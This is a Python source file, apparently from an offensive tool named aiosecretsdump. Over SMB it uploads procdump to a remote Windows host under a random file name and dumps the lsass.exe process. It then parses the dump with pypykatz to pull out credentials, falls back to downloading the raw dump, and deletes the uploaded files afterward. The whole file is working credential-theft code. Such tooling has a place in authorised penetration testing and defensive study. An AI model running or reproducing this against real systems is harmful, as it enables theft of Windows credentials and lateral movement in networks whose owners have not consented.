
import os
import json
import asyncio
from pathlib import Path

from concurrent.futures import ProcessPoolExecutor

from aiosecretsdump import logger
from pypykatz.pypykatz import pypykatz
from tqdm import tqdm
from aiosmb.commons.interfaces.file import SMBFile

async def smb_task_lsass(machine, outfolder = None, use_share = 'C$', use_dir = 'temp2', procdump_local_path = 'bins', is_32 = False):
	logger.info('[+] Starting LSASS_TASK on %s' % machine.connection.target.get_hostname_or_ip())
	try:
		shares = {}
		async for share, err in machine.list_shares():
			if err is not None:
				return False, err

			shares[share.name] = share

		if use_share not in shares:
			return False, Exception('Requested share name %s was not found!' % use_share)
		
		logger.info('[+] LSASS_TASK creating temp folder on C$...')
		await shares[use_share].connect(machine.connection) #connecting to share
		current_directory = shares[use_share].subdirs['']
		await current_directory.list(machine.connection)

		if use_dir not in current_directory.subdirs:
			logger.info('[!] LSASS_TASK Requested subdir was not found! Creating it...')
			_, err = await current_directory.create_subdir(use_dir, machine.connection)
			if err is not None:
				logger.info('[-] LSASS_TASK Failed to create requested directory "%s" Reason: %s' % (use_dir, str(err)))
				return err

			await current_directory.list(machine.connection)

		bpath = '%s:\\%s' % (use_share[0], use_dir)
		uncbp = '\\%s\\%s' % (use_share, use_dir)

		pb = '%s.%s' % (os.urandom(8).hex(), 'exe')
		lb = '%s.%s' % (os.urandom(8).hex(), 'dmp')
		procdump_basepath = '%s\\%s' % (bpath, pb)
		procdump_uncpath = '%s\\%s' % (uncbp, pb)

		lsass_dump_basepath = '%s\\%s' % (bpath, lb)
		lsass_dump_uncpath = '%s\\%s' % (uncbp, lb)
		
		logger.info('[+] LSASS_TASK Uploading procdump binary to %s' % (procdump_uncpath, ))
		procname = 'procdump64.exe'
		if is_32 is True:
			procname = 'procdump.exe'
		procpath = Path(str(procdump_local_path)).joinpath(procname)
		_, err = await machine.put_file(str(procpath), procdump_uncpath)
		if err is not None:
			logger.error('[-] Failed to upload procdump! Reason: %s' % err)
			return False, err
		
		prcdump_cmd = '%s -accepteula -ma lsass.exe %s' % (procdump_basepath, lsass_dump_basepath)
		logger.info('[+] LSASS_TASK Executing procdump on remote machine. Cmd: %s' % prcdump_cmd)
		_, err = await machine.tasks_execute_commands([prcdump_cmd])
		if err is not None:
			logger.error('[-] Failed to execute command on the remote end! Reason: %s' % err)
			return False, err

		logger.info('[+] LSASS_TASK Obligatory sleep to wait for prcdump to finish dumping...')
		await asyncio.sleep(5)
		logger.info('[+] LSASS_TASK Parsing LSASS')
		res, err = await parse_lsass(machine, lsass_dump_uncpath)
		if err is None:
			if outfolder is None:
				print(str(res.to_grep()))
			else:
				with open(outfolder.joinpath('results.txt'), 'w') as f:
					f.write(str(res))

				with open(outfolder.joinpath('results.json'), 'w') as f:
					f.write(res.to_json())

				with open(outfolder.joinpath('results.grep'), 'w') as f:
					f.write(res.to_grep())

		else:
			logger.error('[-] LSASS_TASK Failed to parse the remote lsass dump!')
			if outfolder is None:
				logger.info('[!] LSASS_TASK no output folder specified, skipping downloading unparsable dumpfile!')
				return False, None
			logger.info('[+] LSASS_TASK Downloading dumpfile as failsafe')
			
			file_name = 'lsass.dmp'
			file_obj = SMBFile.from_remotepath(machine.connection, lsass_dump_uncpath)
			with tqdm(desc = 'Downloading %s' % file_name, total=file_obj.size, unit='B', unit_scale=True, unit_divisor=1024) as pbar:
				with open(outfolder.joinpath(file_name), 'wb') as outfile:
					async for data, err in machine.get_file_data(file_obj):
						if err is not None:
							raise err
						if data is None:
							break
						outfile.write(data)
						pbar.update(len(data))

			await file_obj.close()

			logger.info('[+] LSASS_TASK Sucsessfully downloaded %s' % file_name)
		
		logger.info('[+] LSASS_TASK Parsing success, clearing up...')
		_, err = await machine.del_file(lsass_dump_uncpath)
		if err is not None:
			logger.warning('[!] LSASS_TASK Failed to clear up LSASS dump file!')
		_, err = await machine.del_file(procdump_uncpath)
		if err is not None:
			logger.warning('[!] LSASS_TASK Failed to clear up Procdump executable!')

		return True, None

	except Exception as e:
		print(str(e))
		return None, e


#### internal functions! all methods should use parse_regfiles for on-the-fly parsing
def parse_lsass_blocking(lsass_file, lsass_unc):
	try:
		lsass_file.open(lsass_unc, 'rb')
		res = pypykatz.parse_minidump_external(lsass_file)
		lsass_file.close()
		return res, None
	except Exception as e:
		return None, e

async def parse_lsass(machine, lsass_unc):
	try:
		lsass_file = machine.get_blocking_file()
		loop = asyncio.get_event_loop()

		with ProcessPoolExecutor() as process_executor:
			coro = loop.run_in_executor(process_executor, parse_lsass_blocking, lsass_file, lsass_unc)
			res, err = await coro
			
			if err is not None:
				return None, err

		return res, None

	except Exception as e:
		return False, e